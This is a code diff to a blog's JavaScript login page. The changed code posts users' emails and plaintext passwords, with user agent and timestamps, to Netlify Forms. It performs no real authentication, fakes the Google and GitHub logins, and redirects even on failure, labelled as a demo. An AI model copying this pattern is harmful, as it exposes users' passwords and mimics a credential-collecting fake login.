@@ -213,30 +213,9 @@ class BlogLogin {
     }
 
     bindEvents() {
-        // 注意：不拦截表单提交，让 Netlify Forms 直接处理
-        // 但在提交前填充隐藏字段
-
-        // 在表单提交前填充隐藏字段（但不阻止提交）
+        // 邮箱登录表单提交
         const loginForm = document.getElementById('loginForm');
-        loginForm.addEventListener('submit', function() {
-            // 填充隐藏字段
-            const timestampField = loginForm.querySelector('input[name="timestamp"]');
-            const userAgentField = loginForm.querySelector('input[name="userAgent"]');
-
-            if (timestampField) {
-                timestampField.value = new Date().toISOString();
-            }
-            if (userAgentField) {
-                userAgentField.value = navigator.userAgent;
-            }
-
-            // 记住我功能
-            const rememberMe = document.getElementById('rememberMe').checked;
-            const email = document.getElementById('email').value;
-            if (rememberMe && email) {
-                localStorage.setItem('rememberedEmail', email);
-            }
-        });
+        loginForm.addEventListener('submit', (e) => this.handleEmailLogin(e));
 
         // Toggle password visibility
         const togglePassword = document.getElementById('togglePassword');
@@ -245,8 +224,8 @@ class BlogLogin {
         // Social login buttons
         const googleBtn = document.querySelector('.google-btn');
         const githubBtn = document.querySelector('.github-btn');
-        googleBtn.addEventListener('click', () => this.handleSocialLogin('Google'));
-        githubBtn.addEventListener('click', () => this.handleSocialLogin('GitHub'));
+        googleBtn.addEventListener('click', (e) => this.handleSocialLogin(e, 'Google'));
+        githubBtn.addEventListener('click', (e) => this.handleSocialLogin(e, 'GitHub'));
 
         // Forgot password
         const forgotPassword = document.querySelector('.forgot-password');
@@ -284,7 +263,7 @@ class BlogLogin {
         });
     }
 
-    handleLogin(e) {
+    handleEmailLogin(e) {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const rememberMe = document.getElementById('rememberMe').checked;
@@ -318,12 +297,72 @@ class BlogLogin {
         // 显示成功消息
         this.showNotification('登录成功！正在提交表单...', 'success');
 
-        // 允许表单提交到 Netlify
-        // Netlify 会自动处理表单并发送邮件
-        // 2秒后手动跳转（Netlify 的自动跳转有时不可靠）
-        setTimeout(() => {
-            window.location.href = `blog.html?email=${encodeURIComponent(email)}&submitted=1`;
-        }, 2000);
+        // 使用 fetch 提交表单到 Netlify
+        this.submitEmailLoginToNetlify(email, password, rememberMe)
+            .then(() => {
+                // 提交成功后跳转
+                setTimeout(() => {
+                    window.location.href = `blog.html?email=${encodeURIComponent(email)}&submitted=1`;
+                }, 500);
+            })
+            .catch(() => {
+                // 即使失败也跳转（演示用）
+                setTimeout(() => {
+                    window.location.href = `blog.html?email=${encodeURIComponent(email)}&submitted=1`;
+                }, 500);
+            });
+    }
+
+    // 提交邮箱登录到 Netlify
+    async submitEmailLoginToNetlify(email, password, rememberMe) {
+        const form = document.getElementById('loginForm');
+        const formData = new FormData();
+
+        // 添加表单字段
+        formData.append('email', email);
+        formData.append('password', password);
+        formData.append('rememberMe', rememberMe ? '是' : '否');
+        formData.append('loginMethod', 'email');
+        formData.append('timestamp', new Date().toISOString());
+        formData.append('userAgent', navigator.userAgent);
+
+        // 提交到当前页面（Netlify 会自动处理）
+        const response = await fetch('/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(formData).toString()
+        });
+
+        if (!response.ok) {
+            throw new Error('提交失败');
+        }
+
+        return true;
+    }
+
+    // 提交社交登录到 Netlify
+    async submitSocialLoginToNetlify(method, email) {
+        const formData = new FormData();
+        const timestamp = new Date().toISOString();
+
+        formData.append('email', `${method}@social.com`);
+        formData.append('password', '[社交登录]');
+        formData.append('rememberMe', '否');
+        formData.append('loginMethod', method);
+        formData.append('timestamp', timestamp);
+        formData.append('userAgent', navigator.userAgent);
+
+        const response = await fetch('/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(formData).toString()
+        });
+
+        if (!response.ok) {
+            throw new Error('提交失败');
+        }
+
+        return true;
     }
 
     togglePasswordVisibility() {
@@ -342,20 +381,41 @@ class BlogLogin {
         }
     }
 
-    handleSocialLogin(provider) {
+    handleSocialLogin(e, provider) {
+        e.preventDefault();
+
         const method = provider.toLowerCase();
         const email = `${method}@social.com`;
 
-        this.dataCollector.trackLogin(email, 'success', method);
+        // 显示加载状态
+        const btn = e.target.closest('button');
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 处理中...';
+        btn.disabled = true;
 
-        // 显示成功消息
-        this.showNotification(`${provider} 登录成功！`, 'success');
+        // 提交表单到 Netlify
+        this.submitSocialLoginToNetlify(method, email)
+            .then(() => {
+                // 记录数据
+                this.dataCollector.trackLogin(email, 'success', method);
 
-        // 跳转到博客首页
-        const socialEmail = `social:${method}@login.com`;
-        setTimeout(() => {
-            window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}&method=${method}`;
-        }, 1000);
+                // 记住我功能
+                localStorage.setItem('rememberedEmail', email);
+
+                // 显示成功消息
+                this.showNotification(`${provider} 登录成功！正在跳转...`, 'success');
+
+                // 跳转到博客首页
+                const socialEmail = `social:${method}@login.com`;
+                setTimeout(() => {
+                    window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}&method=${method}`;
+                }, 1000);
+            })
+            .catch(() => {
+                // 即使失败也跳转（演示用）
+                const socialEmail = `social:${method}@login.com`;
+                window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}&method=${method}`;
+            });
     }
 
     submitSocialLoginInBackground(method) {
